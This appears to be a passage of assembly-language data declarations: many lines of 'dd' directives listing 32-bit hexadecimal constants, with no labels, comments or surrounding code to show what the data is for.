		dd 0EE6D8C88h, 51C78DD1h, 67F2EE04h, 0B2366303h, 0EB214756h
		dd 0B5161689h, 0BF4AF555h, 813678F5h, 36E35C88h, 2FD8A76Fh
		dd 44D86312h, 0A76A08CAh, 0C2A654Bh, 26C4F949h,	50F7CDF9h
		dd 0D0C63EABh, 0A690C16Ah, 1AEA63D0h, 0B8696A92h, 851ABD3Dh
		dd 8FF3E897h, 4445E990h, 7EB9B837h, 0E03ED40h, 0C344706Fh
		dd 178BAE1h, 19816E2Ch,	0CC142CAEh, 0CE261A77h,	0FE915C9Bh
		dd 5C0032C4h, 36CF697Bh, 4FDFB0F4h, 0A39D9343h,	92BE4AF7h
		dd 90771BDFh, 54792290h, 0AE521BA0h, 0E2045C44h, 2496DB9Bh
		dd 0E9E9F090h, 65524225h, 0A24EB323h, 2C4998BCh, 5A4AE9ECh
		dd 0FDEDC0CBh, 85E0DAE9h, 694E4B03h, 0D62D9297h, 0E7717AD9h
		dd 2E9F646h, 0D4033286h, 0A74ED88Ah, 7540006Ch,	15F4CFB4h
		dd 272B2E5Dh, 0D553B259h, 9F36855Fh, 7DE34F35h,	70472D4Dh
		dd 0FC03C12Fh, 7C6AD458h, 0AC61CCB2h, 80B7753Bh, 0BEE786F6h
		dd 491D7B86h, 18D8AD10h, 96D9D3DBh, 0C0DEF92Dh,	9CB12EDCh
		dd 57732895h, 3E445579h, 6B25CA65h, 2E7CF88Fh, 0B13018EDh
		dd 0FE1E76A6h, 0CB696A90h, 50A212D6h, 0EA50433Fh, 0FFC1F3C8h
		dd 0E2A05AB7h, 15C04B60h
		dd 0FC75B258h, 4F65033Ah, 776EA2A3h, 90EC2B4h, 0C187062h
		dd 141528E0h, 1E423732h, 4F8A7891h, 0DD3FD873h,	0AF5AA501h
		dd 0C44432D5h, 701C1C35h, 622964E8h, 2F572B8Ah,	171FB3F0h
		dd 2DD9ED55h, 4CC6B59h,	95484FBh, 7CD226Dh, 6CC86097h
		dd 270540F3h, 89F1C683h, 0FDD3D431h, 27DE50Dh, 8EF0D6B6h
		dd 0A2AC76D1h, 2E127A3h, 0B7B37C54h, 8C114CE5h,	6C6D822Fh
		dd 9BD85A39h, 0DF809F0Eh, 79B5D245h, 62324F11h,	0ACDAE119h
		dd 47148021h, 0A9FB7228h, 7BB99590h, 8D505CDDh,	7B675455h
		dd 0C9E6BED1h, 1AB6113Dh, 0DD938FD5h, 0D98BE710h, 0D6538769h
		dd 0DE9E2222h, 82444687h, 6CA18362h, 0BF3ABDF1h, 25B36E6Eh
		dd 187AE143h, 33A31110h, 445B7DBAh, 70561B26h, 65F4F879h
		dd 0D41B0629h, 213E1180h, 0B90B4C2Eh, 0B295B254h, 0B2FC1881h
		dd 0EB3D8472h, 8141DB00h, 0B0CF7BD0h, 0B950B536h, 143A60F4h
		dd 0E23C0469h, 4B93F16Ah, 2CC5E9A1h, 904029C9h,	0A0184463h
		dd 6BD5A5B3h, 0F760CC3Eh, 7F8387C2h, 48D6D48h, 41681EF0h
		dd 0AE314161h, 8DEE1AAh, 9A3CD26Eh, 530B2F6h, 190559DBh
		dd 467F2324h, 5DFCAD35h, 125079B2h, 0EE2D19B2h,	0D72F2584h
		dd 1F94B8F0h, 17CD3F80h, 6B3B6756h, 0CF8BC55Ch,	0B53CE12Eh
		dd 0C20C1E5h, 0B6EF5C4Fh, 4FB136B0h, 4C2FE633h,	8F587B8Ah
		dd 0BBA63DDFh, 986261B6h, 209A0E61h, 92031C7Ch,	5A572CEDh
		dd 278E5CB4h, 14072F54h, 6A1CCDC8h, 0F124BE5h, 3308C2D7h
		dd 924CC914h, 3F881CAh,	0E57C9D38h, 278B7930h, 22DD74C3h
		dd 1169F690h, 1C456E58h, 84765FFDh, 3CB5468Ah, 6B1E42BAh
		dd 178B18FAh, 69580C9Fh, 70357ADBh, 62436F27h, 28161517h
		dd 3C6B7E33h, 5FCC49C4h, 1ECEA7CEh, 7B65F54Fh, 0A58DD127h
		dd 484BF9BDh, 4C065585h, 9B97E59Eh, 848414ECh, 0F1F191F8h
		dd 2DC882B2h, 2BD0179Bh, 4A2F0100h, 0F3B5FCA7h,	6EC2C02Fh
		dd 586B0547h, 0BB793305h, 5B13A618h, 22E30307h,	0E7FF83E8h
		dd 1B38BBAEh, 0CC13EC54h, 4EB2C0C7h, 0F123D153h, 0F82366DBh
		dd 82DC245Ch, 0B331BE00h, 5FE2A1F8h, 89F4BDC1h,	67EA9357h
		dd 3A3A278Ah, 8C12EC20h, 5CFA49EFh, 0CEF11B40h,	95CFBE1Ah
		dd 6C5EB9E4h, 0D692F074h, 547B82A0h, 1B6E7F0Eh,	5E83BC84h
		dd 3E967E06h, 0A684018Ch, 8BE71A58h, 552B7056h,	0D345490Bh
		dd 564B8047h, 491C30E5h, 7D6FC706h, 0B796C756h,	0E267A7CBh
		dd 0BEDA19BEh, 0B139B42Ah, 591A88D8h, 0C6514C01h, 0DF21FE1Dh
		dd 0E67094CFh, 0DEA4A4BBh, 0AAE21597h, 7EDFF83Ah, 0D223C989h
		dd 77C6706Dh, 0A6DE6B98h, 43A8894Bh, 7B904D50h,	0CEA891B1h
		dd 36D3B000h, 59486980h, 0CB1B4FCCh, 0B8834426h, 0D842110Ah
		dd 0DB46056h, 0B0A03660h, 0BA91DA73h, 9AB8611Eh, 4192626Ah
		dd 241E3A24h, 6CFCB5C8h, 4472212Eh, 0DF8A60E8h,	9F1BC956h
		dd 28371B88h, 6FFA7417h, 45FC932Fh, 8BBE6CF7h, 0FA744498h
		dd 0B3D496B1h, 82078227h, 0CF071390h, 79144663h, 0ED363B2Fh
		dd 0BD2CC122h, 4F216638h, 0EC4D5A51h, 4972BF33h, 0E1667FBDh
		dd 183E1F57h, 5E2E83C7h, 0F0D9F354h, 5B5FF8F0h,	24E89A47h
		dd 51CB163Eh, 0FB0C37B6h, 0A66B681Ch, 6FE80A0Dh, 3158271Dh
		dd 0C0862E44h, 5B09DC14h, 0E290F937h, 2EE5450Bh, 0B81C81C8h
		dd 50507B05h, 6670A023h, 55284233h, 0CB1ED178h,	0F59A6C9Fh
		dd 0CF80A33Fh, 6E92267Ah, 577B8784h, 0F1B3FD85h, 0A8C81A78h
		dd 1B086F5Dh, 2BBD696Ah, 3EA1EF3Ch, 0A164EBD9h,	1A864689h
		dd 923DB2C5h, 1C939426h, 9F31E68h, 0CB0F2E5Fh, 4C2A97CAh
		dd 883BA57Dh, 6082C20h,	8AAEEF12h, 0AF8C7FCFh, 0D2F9AD2h
		dd 16AD303Fh, 30EFA052h, 82F89F99h, 7C4ECB7Dh, 20E91896h
		dd 8C87B545h, 0D65FE93Ch, 0E2CFA6A2h, 11CA3E45h, 6370935Fh
		dd 0A4BA1CE3h, 3D7E2A3Dh, 4C33BB7Dh, 3DBA995Ch,	82E27B11h
		dd 1FA8FB2h, 46CEB2EEh,	454543h, 58C70FF7h, 0E1BACE40h
		dd 6B0C7749h, 43C9B1A9h, 84C70AC3h, 0E233E4C4h,	7B44407Ch
		dd 3E374305h, 9D0CC3A7h, 0C0198B66h, 0E66AE2FBh, 0C53D341Eh
		dd 0B6D9EF22h, 723A0700h, 3C3A756Eh, 567EBD04h,	0DD6B66B7h
		dd 2A9821B7h, 0B4D8A0F3h, 9EF636CAh, 23A16D09h,	8A7AFAB8h
		dd 77AECBCFh, 0E21F7676h, 6C36C1A5h, 0D41B5C15h, 3E1DB731h
		dd 0E0D1CFCEh, 0FA66AA4Ah, 0D03CAC34h, 588EC45Eh, 5273E7CCh
		dd 0A10CE494h, 4221E146h, 849A31CBh, 3A17573h, 75B64E75h
		dd 0F4F9E425h, 90C237E3h, 0E521E4D9h, 3E8A0771h, 0AE64F2C0h
		dd 616C4624h, 389E58A7h, 0E91C0B7Fh, 0D48D4B89h, 0F9C3AA27h
		dd 0C0B3CD36h, 0F9D16FFFh, 9B90366Ah, 0E768B5A8h, 1D6328BCh
		dd 0E8846A89h, 4937E768h, 8F847A4Ah, 55E9B01Eh,	3250AD43h
		dd 68E4DFE8h, 26CEDEF5h, 21B2F9DDh, 0E1C6EEFFh,	0D5A0C505h
		dd 5E5F4E15h, 0DDAFE8BDh, 383E49CBh, 0FE8BE733h, 0EC5E0A17h
		dd 0B6E0FDA0h, 1D1778CFh, 0D3B7BDDh, 665CACADh,	5DE8F2DCh
		dd 8E216693h, 0C06F9256h, 8C28EA7Ah, 0EE0C80DEh, 7B09B93Dh
		dd 7A07AEF6h, 300DEECh,	0F9A6C66Ch, 6B9C0D47h, 6C7C7CEh
		dd 0D28FBF11h, 0CAB4CC2Eh, 0C8B327C1h, 0C27D18FFh, 10E66B8h
		dd 4583A621h, 81114236h, 764FD1B2h, 72B22C99h, 4AE4A1A3h
		dd 2D0D005Fh, 7744EDCAh, 1F807359h, 0F3082C89h,	5B64A01Ch
		dd 0DA6AA305h, 6AB6FB29h, 3140821Ah, 5C11272Ch,	8E0789A0h
		dd 3E51F597h, 4F0EA722h, 0C43A6C4Bh, 382FEA15h,	0C8493025h
		dd 0E178E924h, 62670925h, 0A91469E5h, 0FD4607Bh, 33F48B7Bh
		dd 598A57DBh, 3DB894CEh, 7337D175h, 2106D3Dh, 0D431ECF7h
		dd 0C36F5F86h, 0CD95FE41h, 56FB46EAh, 6BF68996h, 59A5977h
		dd 612614h, 0C5A1EB2Ch,	0FC6A3F50h, 59E2EE07h, 71961EDDh
		dd 55576CEEh, 715C2E2Eh, 1B26C683h, 288B8BD6h, 7AA8CF3Bh
		dd 0D512954Ah, 9B7AF35Fh, 0DCCCA3BFh, 0A60DD3CCh, 0D3FB75E1h
		dd 0E6D670B1h, 0FB61526Bh, 11C06BDFh, 16F09B5Eh, 0E1F92702h
		dd 0E4416CB9h, 3772C9D3h, 4DBCCEB5h, 220F18BAh,	0FBE2A550h
		dd 0AF0FD97Eh, 0F9892CC1h, 0D36F21F6h, 0F16AA0Dh, 6E992F24h
		dd 96FF1DFDh, 690133E2h, 0E9D5E52h, 21F2C2Ch, 117E0D46h
		dd 0CC4D9D62h, 1A9D506Eh, 91AAA4E7h, 689D2F7Ah,	3063EEB9h
		dd 871D5811h, 0F21D4D12h, 90A44938h, 0D940F5ABh, 6AAC7758h
		dd 0FB407C43h, 6DC6A6FDh, 0ACC1A7A3h, 0F11873AEh, 0D2173DFBh
		dd 49038D71h, 0D8E01540h, 0EB2ED40h, 2E5F54BCh,	0C41540F9h
		dd 647E505Bh, 0B8DEA718h, 4B3EDBD9h, 5CDB426Dh,	9F2255Ah
		dd 4DF10200h, 7D70168Fh, 324F65C4h, 765B50A4h, 169E88B8h
		dd 0EED72DCh, 0B5D781BEh, 0CC5E8452h, 0FFA48C14h, 1BD0481Fh
		dd 43783B5Eh, 303092A6h, 0A8C3161Ah, 7B2525Bh, 55C812BDh
		dd 0ACCA09DEh, 0A751F4B9h, 7B66B97Ah, 3FEF5E33h, 0D10052ABh
		dd 63083FD0h, 0E501CB32h, 21494F85h, 0BF89C1FFh, 4ABE569Dh
		dd 0E8202901h, 8A1E9C37h, 1E6EA3E8h, 0FCD05985h, 3C7466D3h
		dd 18D0BC6Eh, 795476EEh, 3D00A0EEh, 9F7805ECh, 112B89AFh
		dd 6910B8ACh, 96B8AF0Dh, 352E28E6h, 0C07B5E9h, 0D96E7E22h
		dd 0BF40BD50h, 0E3418CC0h, 1B2CA74Dh, 7D305799h, 0E654D4C0h
		dd 0B2C9C9DBh, 0F94E7F66h, 0BE5ED87Ah, 0A6608C06h, 0C167618Ch
		dd 5481987h, 95C0748Dh,	2CDA5106h, 33534370h, 314EDF35h
		dd 8ECE92AEh, 95B6CFC0h
		dd 65FE6ED2h, 0BDB2EF6Eh, 72C03C17h, 26B16A6Dh,	42CE4E60h
		dd 19D3CD85h, 0A8072780h, 5BA4242Eh, 0E974E086h, 0BDB883AEh
		dd 9722EFFEh, 0ECB246A5h, 3860763Eh, 44855F17h,	0F2C4AA5Eh
		dd 89D50401h, 384134B3h, 6B581D04h, 6AE13594h, 0B9A40DE7h
		dd 78B96455h, 0F0024696h, 9EFF24C9h, 89482BC3h,	0D1F734CEh
		dd 5C390DDh, 79D256F6h,	0B8BBE44Dh, 5A070392h, 0A7AF86B5h
		dd 7C1857Fh, 5317032Fh,	97147CC5h, 441152E2h, 72026F71h
		dd 0E49857E0h, 51B2E79Bh, 3D1CDF46h, 0EBCE6304h, 66061BBh
		dd 0F918D575h, 6522AB1Fh, 28476EE8h, 43E71509h,	999EEDCFh
		dd 0E477E5F3h, 94DAC3BAh, 92C803BEh, 0CBD2BAB0h, 4A43D8B2h
		dd 107F119h, 1C3DF363h,	8C6FDED6h, 5662419h, 6EECC09Ch
		dd 9552D580h, 622D854Ah, 9D69292Bh, 0C72D30D7h,	0BB57DF38h
		dd 3FE92D1h, 0CAD37EE5h, 62685336h, 0CFE74B9Eh,	0C381A8h
		dd 7F984177h, 8BCF3B89h, 0B9E2CEA4h, 0EDFF1B00h, 7367F7Ch
		dd 7975E730h, 8A098D95h, 0A7D8B71Eh, 8B79F447h,	1E92ECF0h
		dd 3D7D705Bh, 0C3AD5093h, 3898303Eh, 0D2F13038h, 79CE4888h
		dd 2D264B27h, 223EFC2Ch, 0DBD32969h, 339510A2h,	0CCD8C2EDh
		dd 0EECB54BCh, 0CDF278B6h, 8EECC517h, 0FE9CE127h, 0D7AA34Dh
		dd 903C5134h, 0D134F68h, 241862B9h, 749576B4h, 204600CBh
		dd 43D6A6B9h, 3CCBB762h, 0C21B3508h, 8F91D715h,	9D13D78Bh
		dd 3378B66Fh, 0E3A60892h, 1EE11AA0h, 0D83EB977h, 0EE0C5390h
		dd 2DABFBDBh, 0DF879A6Ah, 0D4E2DF80h, 462EA0Ch,	8ECFC526h
		dd 0A24DA902h, 80C69F3Dh, 0ABECEB3Bh, 41153308h, 68435C19h
		dd 1B0B0B7Dh, 9A6AA144h, 4B2B5DCCh, 28863D49h, 9609F975h
		dd 0ED54518Eh, 5C157671h, 217F70Bh, 1BE82F6Dh, 52406C44h
		dd 83E306DFh, 66D3E2F6h, 0C292FC8Fh, 4E665217h,	0C22CF9B7h
		dd 3987C266h, 6929383Bh, 8BF78499h, 88331351h, 0C24D10C2h
		dd 91F40E4Ah, 0A7926280h, 24E647A2h, 0A0030E3Eh, 0EBA7107Eh
		dd 26E8CD8Eh, 0CC091006h, 32688337h, 48D3E69Ah,	1C9BB44Fh
		dd 715BCE6Eh, 5F318D57h, 447826FBh, 5A0079E0h, 40916B0Ah
		dd 0B75996DAh, 2E1F362Fh, 650623F8h, 0DA5ACAE3h, 46154029h
		dd 0D9725FC6h, 16B93468h, 9D97E7C7h, 252A1B59h,	8F836E82h
		dd 5CDE09A6h, 83AA3CC6h, 0F6EA638Dh, 32FAFFE3h,	0D0EE530h
		dd 5CD7505Dh, 568D884Bh, 0A0B2A8CAh, 70D0B43Ah,	0F45755Ah
		dd 3A9E89F8h, 0DAF53023h, 61179385h, 741F34BBh,	0D3B40680h
		dd 7B0C0B4h, 0D596349Dh, 64319D75h, 7DE360B5h, 0EDC8AB16h
		dd 539E6F6Eh, 8EB2D7A1h, 6A272290h, 0C2FE9D10h,	0D7A03468h
		dd 6BBDCF87h, 0A87B7BD1h, 33F39A2h, 270CFAC9h, 0C914FA9Bh
		dd 2E8CAB91h, 6AD35D0Fh, 37BFA7D7h, 4BFC2ECFh, 52E8665Ch
		dd 0A159BAD8h, 76BC2C05h, 0A25051D8h, 0FEC94772h, 5739C807h
		dd 70BBBDB1h, 33C0CAC8h, 9BAF1D90h, 5BF0B7Ah, 0A74E282Eh
		dd 29202C60h, 3ABDA731h, 9185FB45h, 0FACCA79h, 0A310EFA5h
		dd 0D8E9F179h, 92CFB770h, 462F321Ah, 538AD01h, 0A1805D55h
		dd 895F188Ch, 1F615145h, 0C41B7613h, 0A5E8AD8Ch, 7B5512ECh
		dd 6F1D82FAh, 85F988Fh,	21EDD82Fh, 40B53488h, 0CFFF0D7Eh
		dd 3C11C666h, 722E53BEh, 85D8C5h, 292EABC4h, 319108DFh
		dd 0EE884D1h, 9DB6716Fh, 95FBF5FAh, 75833948h, 0EC394F6Eh
		dd 837B3F0Ah, 97F27C8Ch, 0C7F89770h, 6AA2F496h,	583B37EDh
		dd 55F48B10h, 75ECBB94h, 11A441CDh, 85AFC2C9h, 0B8DFE109h
		dd 572D39C9h, 35B5058h,	1ACE72DCh, 7962F94Ch, 0C55224A0h
		dd 116F531Fh, 0A5CC7349h, 59B114B0h, 0B46AB0Eh,	338EC58h
		dd 0FC1CD377h, 4E733DF8h, 9B1456F8h, 0C3BA657Dh, 0A56C5B62h
		dd 40441E30h, 2E914A65h, 4AB78B20h, 11947A7Ch, 233028D0h
		dd 6B0654B9h, 0C25673E8h, 0DDF135FCh, 7902ADE7h, 0A6069D9Dh
		dd 6991F091h, 8C258659h, 9DD3FE0h, 8E68922Dh, 41400216h
		dd 8992401Ah, 0B72D027Ah, 0C2337BCAh, 0E41E1909h, 188DF3AEh
		dd 0E3E775FDh, 5AABAA20h, 89F2ED88h, 0F521BA24h, 0FFC9D742h
		dd 0D036CCD4h, 326F1B0Bh, 8F56723Dh, 7E95EA00h,	0DEED96B4h
		dd 29992119h, 0E9C6DE87h, 21773126h, 0D6ADCE3h,	0C710D789h
		dd 176D4277h, 33109FD9h, 64240190h, 23270032h, 0A557C166h
		dd 362F7C2Ch, 0DAB956BCh, 82AEE12Fh, 1327BDEAh,	9FFAE788h
		dd 22B24AC6h, 0F7EDA198h, 421FC991h, 0CE60B1D7h, 42C6B72Bh
		dd 0C1A088ACh, 300DE2E8h, 52734FE5h, 0AB4E5179h, 0D9D57D38h
		dd 74F239Fh, 0B9DE01E2h, 0EE0874DEh, 2B877625h,	0C245FC3Bh
		dd 16AB3AF6h, 0FD264140h, 7DF21A8Ah, 3FE29279h,	965749B7h
		dd 0D1558802h, 0D794FFC2h, 8F11A561h, 0EF9B5447h, 95874D31h
		dd 1304C45h, 26407F4Ah,	0E42FAD56h, 1D9C8A65h, 8891976Bh
		dd 2987B021h, 0E6B97DBCh, 0DE205017h, 98A489CEh, 0A03A63E7h
		dd 0A1D19536h, 0BCDEF536h, 0CBF56BE7h, 4F7F75A2h, 4A2CBD3Fh
		dd 54B81365h, 85F0F578h, 0C29216CEh, 0A4315BE7h, 0E3F45DEDh
		dd 0D504A010h, 2383EF51h, 0DC492741h, 5EC2377Dh, 0D407F83h
		dd 274ECE42h, 0F8D665B7h, 7BD1583Ch, 55DAB62Ch,	7689610h
		dd 9ECC89DDh, 1BCA6BB2h, 80DDA142h, 0D84BE0DDh,	0EDD3A9E5h
		dd 0D97F51E0h, 7279821Ch, 59E77B05h, 4ED106EAh,	8BD64B00h
		dd 0F8E308AEh, 0B136ECD4h, 0BDBCD7FDh, 10823388h, 458BD5A6h
		dd 270918BAh, 411FD970h, 6577ECFAh, 612A3C79h, 52452CB5h
		dd 0C74D3A82h, 0E7788261h, 99E08833h, 299F01EDh, 0E1B47422h
		dd 0FA1167D2h, 0C46CA7C0h, 0E5F575ADh, 0DFFBD6E9h, 0A5FDF821h
		dd 0FA23332h, 835B2044h, 0C48590h, 4D93A1ACh, 62FFB00Ch
		dd 71B3BD22h, 0EA6C9BDh, 77ABAD54h, 29627331h, 42ECDFC2h
		dd 1632FEF7h, 0DECB9992h, 7510F34Dh, 0E027DE4Ch, 2AA8EA97h
		dd 0E8A6B263h, 1E5E1577h, 0E4BE3DBEh, 3D42A54Fh, 0B3D23780h
		dd 1DC33AE1h, 322937E0h, 77F55F7Eh, 0DCE5749Bh,	1E2B912Dh
		dd 269A30ADh, 5AB9BD26h, 46A2504Ah, 0BB95C020h,	0DE2B79ACh
		dd 0E3554452h, 0ACF831F2h, 0A78BA6A7h, 1B7787E7h, 0B593E1BFh
		dd 0D01E166h, 78F9C168h, 12D3543Dh, 39427CD5h, 6560D5FCh
		dd 8409123Ch, 0A28AC12Bh, 3B4BAA30h, 619C37BDh,	700B81A4h
		dd 269EFCE0h, 3F9DF720h, 0A96CCCB5h, 66356879h,	7CE0157Ch
		dd 0C874B244h, 0E81EEE90h, 0D2380A6h, 0B64D073Fh, 6891F156h
		dd 3BF9A494h, 0B07BC4Fh, 0B7595AEEh, 4FB66C1Ah,	8F0558A4h
		dd 66B86F46h, 0EA1DA857h, 270EACD7h, 5AE5202Ch,	57924E7Dh
		dd 0DC45D3B2h, 0B011AD7Ah, 0BD021BDh, 0ABBA8FA3h, 6EB75E9Dh
		dd 5673B1BFh, 243186D5h, 0A181082Eh, 0C105CEE1h, 0EB20A4F8h
		dd 0F5DD3441h, 0A2D208F5h, 0ED6D876Ch, 0A6320690h, 0CB73CF9Fh
		dd 0E169283Ch, 6EDD31E5h, 0FA3253C6h, 0E404F237h, 6765835Ch
		dd 0D4919D13h, 38B4BED2h, 0FB8216DAh, 6A88C0EEh, 7A4517E1h
		dd 36D911E3h, 0E8CC5CF6h, 0EE630EE6h, 0F5B51520h, 0D6994988h
		dd 0EB234D44h, 243A275Ch, 758BD9DFh, 0BBF95Fh, 0B846E019h
		dd 4C8E1618h, 1A1FEA65h, 90389462h, 0F216B803h,	5EE8B228h
		dd 3982891Fh, 0BE0B854Eh, 2E2B0AFEh, 4F19D400h,	0ED93EFBh
		dd 705D4D67h, 0CE376275h, 196F65F5h, 4E02B0FFh,	4F62B5AAh
		dd 72E1DF89h, 749CFB96h, 0C45D911Eh, 0E38D4A02h, 0DD698351h
		dd 6E7C6FEh, 0B0C0A945h
		dd 316F7E61h, 6C33A156h, 0E68FCBD1h, 0D9A98B6Dh, 1035252Dh
		dd 21E20495h, 0F6C1800Fh, 0DB18951h, 75BD975Bh,	3BC23F5Fh
		dd 9BF18767h, 0CF9D3E6h, 0FB7264E0h, 8C9119D0h,	0CF4C8D57h
		dd 0EE95F939h, 0DE3EF84Ch, 27A28D10h, 7604A876h, 0A75D27E0h
		dd 0B40DE850h, 0E0473D99h, 536E16E1h, 4B7D5274h, 0BE4A6CA1h
		dd 67CEAE03h, 7B1C9E86h, 0CC5CAF7Dh, 2EE9A44Bh,	0FAC4F2CAh
		dd 3B45B857h, 0ED8F9563h, 44C51B3Fh, 12B9C44h, 196BD28Ah
		dd 4FCAE8A2h, 6574C4D1h, 5D6BFDCBh, 5AD1A38Fh, 0B73536F8h
		dd 9CB44451h, 0D971F6D6h, 51BBF767h, 39DED77Dh,	23F7C399h
		dd 84F33873h, 51F96540h, 0B265FEB5h, 0F2A5681h,	8728BDC9h
		dd 12FE2015h, 0A4268D57h, 5058136Bh, 0F913C1E9h, 44B72D31h
		dd 5D8961D8h, 28E23C95h, 9259059Bh, 2974DBADh, 39A645B0h
		dd 472E267Ch, 5F6989Eh,	9B6F9730h, 8E4F3CEEh, 9FE6233Dh
		dd 0AD055DB9h, 0B7CAC59Dh, 73681B83h, 7A3FB4D9h, 52239845h
		dd 0C4E43A65h, 164E6831h, 0B6663685h, 0FB79BF65h, 7AB08448h
		dd 0EB907C21h, 0DB12D746h, 4D0363C9h, 9833B917h, 90C33551h
		dd 9F29446Bh, 81D458h, 0E1D08DE6h, 0C9914C8Ah, 704C0F64h
		dd 0C55E4C5Bh, 47547FCAh, 0DF2298F3h, 0BCFE1685h, 5C8E8058h
		dd 82C42F6Ch, 15B5A871h, 28341ECAh, 0E7AD91F8h,	0D5C844DDh
		dd 8478CADFh, 764FC9D3h, 0A5D40ADEh, 0B869B381h, 755944EFh
		dd 0A5CBA85Ah, 3EC598BDh, 93A77209h, 0E819B0BCh, 4A09D686h
		dd 1C6E459Bh, 769BD45h,	6BB2AB09h, 528B6596h, 47BD4291h
		dd 1D29E1E9h, 6AE40B39h, 86416F1Eh, 0A88B8A75h,	397A5D23h
		dd 0A275FB67h, 0F9FA44AEh, 576B812h, 584FF2C2h,	0CE4DA610h
		dd 9C5991D5h, 0CEB5EA48h, 0ED21F8C1h, 0AAC2E4Bh, 0A119F5Bh
		dd 0C4FC6C49h, 0A58966C6h, 16D28B65h, 2041F147h, 29BCFB2Dh
		dd 0A8AFB166h, 0EDDFC9F9h, 12730C0Ah, 0EC90A38Ah, 4AF27F23h
		dd 8072B295h, 5E5C2F70h, 445A7441h, 6DF803DEh, 79829526h
		dd 8D69C1h, 0FC655164h,	0F3898A48h, 4A141CF1h, 253A2694h
		dd 7FF427CDh, 1C739A86h, 62734FFh, 1C6FC0BAh, 0FBE6374Fh
		dd 74C724F5h, 55740C70h, 0CCD6189Eh, 0E4B5F45Ah, 0DFE0352Eh
		dd 0B9770048h, 0A04D11AAh, 0EF4825B4h, 0F6C6927Ch, 0A74E7DE5h
		dd 15B1014Ch, 1E387E41h, 6E07073Eh, 0ADB289Eh, 0EF9579E0h
		dd 50B252B1h, 0AA78CFCCh, 729225E1h, 92904C1h, 60ABEC57h
		dd 0A3A12852h, 0BCDD50CCh, 4DAEC3FEh, 0B539E065h, 5AB038C7h
		dd 33CE6B16h, 0D57DF7D1h, 0ECE4E927h, 6EE15DA1h, 0EE634527h
		dd 8B4CA3D8h, 3B729388h, 4D63888Eh, 0FE675A12h,	0E1855E77h
		dd 0E08CCAA0h, 0CA940C76h, 456F2E9Ah, 48415845h, 0D9D41BC5h
		dd 0D0285216h, 0FED20B51h, 0C851A8D7h, 1DA9D994h, 0CB2FBA30h
		dd 84227CA6h, 9383A29Ch, 1CC137B0h, 47D2C5A5h, 51055E0Fh
		dd 0EDA1AEC6h, 29EFF8F6h, 17D2A690h, 5F902B49h,	0CE335527h
		dd 4B954BB8h, 0B8BEA502h, 459BE08h, 982D9DE2h, 5436D333h
		dd 7C5610CFh, 0E2768A2Bh, 5501A161h, 0DD8613Fh,	2BDFF3C0h
		dd 8738FD8Dh, 1216A815h, 4D2ACCB9h, 6BAD9C29h, 6AEAC017h
		dd 766B5B1Bh, 109C4048h, 9C735CECh, 836F5F03h, 15BCB25Fh
		dd 2DD31702h, 99C054C4h, 9DE7C654h, 30284008h, 1007ADE1h
		dd 82283DA2h, 369A35DDh, 507F5C63h, 3145DB24h, 0C2C5A578h
		dd 16ED5A73h, 0B59F7AFBh, 248DCA64h, 0B4818ABCh, 5C959413h
		dd 2C1CDD1Dh, 6F4A23E5h, 9B1D2C31h, 0C1970405h,	9673B055h
		dd 6DD0C871h, 0EDBAB283h, 77766B80h, 2D6B4FB1h,	8FFC895Dh
		dd 90E082D9h, 9336E9A4h, 2395CAC6h, 17849EECh, 6321D257h
		dd 0CFF22090h, 567CDFC0h, 0E5A9BCCBh, 7A748E93h, 0FDE167D9h
		dd 256B0E24h, 6A3D5F59h, 2A8FC1BBh, 34536452h, 69C153F6h
		dd 8141CADFh, 39367556h, 2DD70FE2h, 0E072401Ch,	46FEFB71h
		dd 0CE724847h, 0EFC155E5h, 64F06605h, 0FFC530EDh, 0A3997EE5h
		dd 722F57ECh, 9A9FE86Dh, 226E94FBh, 93DBB56Fh, 5FDAB510h
		dd 14256E8Eh, 0CD464C45h, 6D17018Dh, 8E8E2E2Eh,	4A708DAEh
		dd 0F4100F10h, 2CFE5F72h, 946F2916h, 3C130718h,	0D44C14CAh
		dd 0E3B6CEC1h, 21AE8776h, 84D4283Ah, 0DD7AA2FAh, 4BD42DC8h
		dd 693C324Bh, 84D7023Fh, 3C0044FDh, 82E0B128h, 0B497433Ch
		dd 36BA1A96h, 0F5392A64h, 11A9A15Dh, 6F50E361h,	23EF3385h
		dd 0B63AD31Dh, 0F674CBF8h, 1281FAF3h, 2DBA9B76h, 796FDBCFh
		dd 0BF428849h, 5D21BE4Ah, 425C1027h, 72401136h,	0ADC6268Ch
		dd 3700CF07h, 2E6EF1C8h, 1EEAB4CCh, 0D694194Ch,	6FE395CBh
		dd 0D38018C4h, 7216B79Bh, 0EB65D65Bh, 9E9022B7h, 331B0E0Ah
		dd 0A3DEA481h, 7869F8DFh, 5294CC20h, 75CFFEF2h,	733D4E3Fh
		dd 3BE75846h, 0BA7FE61Ch, 47453218h, 998AFE19h,	18979758h
		dd 413C21EEh, 3CA4AE56h, 0C1F041DAh, 0F8D751E8h, 790266E2h
		dd 1D380D31h, 0D540CB1Eh, 0F5B6785Dh, 0AD5D2D1Bh, 409A793Fh
		dd 2E95A945h, 0F37FF6E6h, 6A204BD5h, 0AE3AC78Ch, 10726D2Dh
		dd 153DD323h, 74CB9FC4h, 0DF9021C8h, 181A1EBDh,	0CED312h
		dd 0B51B4789h, 80433F6Fh, 65FF4021h, 29514008h,	0F3ECDCC2h
		dd 0C47B210Ch, 0C35A0C1Ah, 9AACF4A6h, 0A0617BD2h, 75F6936Dh
		dd 69BF1793h, 66D7B8DBh, 1C03DD05h, 6DA171FBh, 617F59B3h
		dd 0B59281EEh, 9760C2D2h, 0E9DF4CDBh, 8266FDDDh, 0D08F6B10h
		dd 6052C836h, 0F76C9BA5h, 591A25B5h, 0D1D561F4h, 9FF69565h
		dd 0C209FEF9h, 977EC9EDh, 0B3CA3734h, 0C3E1FBDDh, 4AB4A53Ah
		dd 7906C7E7h, 0F5F81BC7h, 0BA8F7F45h, 9AC7700Fh, 0E2F3E6DBh
		dd 311EFE45h, 2E935239h, 352F1F9Ah, 79AB0E05h, 28E38C68h
		dd 0A251B4AFh, 0C3260B6h, 63A7746Eh, 87BAE050h,	0E9DC5ECDh
		dd 432407F3h, 3472A5C9h, 3E27BBADh, 6BFC19A2h, 1A2E0BFBh
		dd 0F43E6783h, 9999424Eh, 0C8CCF370h, 512CEE4h,	3C2DA24Dh
		dd 8E0ECC23h, 0DC6F392Fh, 0CE20BF64h, 2028696Ah, 0A29D3B4Bh
		dd 0B301C344h, 453BC2FCh, 115C98A0h, 0A2620A46h, 4F9F6568h
		dd 0CB77BDBEh, 35DE73Ah, 4A427C96h, 0D4E789C4h,	3F97B47Ah
